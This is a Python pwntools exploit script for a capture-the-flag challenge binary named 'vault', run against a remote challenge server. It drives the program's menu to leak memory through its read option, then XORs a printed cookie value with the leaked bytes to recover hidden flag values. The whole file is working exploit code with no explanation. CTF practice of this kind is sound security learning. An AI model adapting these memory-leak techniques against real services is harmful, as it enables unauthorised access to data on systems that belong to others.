from pwn import *
elf = context.binary = ELF("./vault")

context.log_level = "debug"

# io = process()

io  =remote("play.scriptsorcerers.xyz", 10420)
# gdb.attach(io)
io.recvuntil(b": ")
cookie_flag2 = io.recvline()[:-1].decode()
cookie_flag2 = int(cookie_flag2,0x10)





io.sendlineafter(b">",b"1")
io.sendlineafter(b"index:",b"0")

io.sendlineafter(b">",b"1")
io.sendlineafter(b"index:",b"1")

io.sendlineafter(b">",b"1")
io.sendlineafter(b"index:",b"2")


io.sendlineafter(b">",b"3")
io.sendlineafter(b"index:",b"0")

io.recvuntil(b"stuff: ")


flag_cookie_xor = unpack(io.recvn(0x8),"all")
print("flag_cookie_xor")
print(hex(flag_cookie_xor))




io.sendlineafter(b">",b"3")
io.sendlineafter(b"index:",b"1")

io.recvuntil(b"ur stuff: ")


cookie = unpack(io.recvn(0x8),"all")


print(hex(cookie))


flag2 = cookie_flag2^cookie
flag_flag2_xor = flag_cookie_xor^cookie_flag2

flag = flag_flag2_xor^flag2


print(hex(flag))


print("#####################3")

flag3 = cookie^flag_cookie_xor
print(hex(flag3))


print("###########")

flag4 = cookie_flag2^cookie

print(hex(flag4))
io.interactive()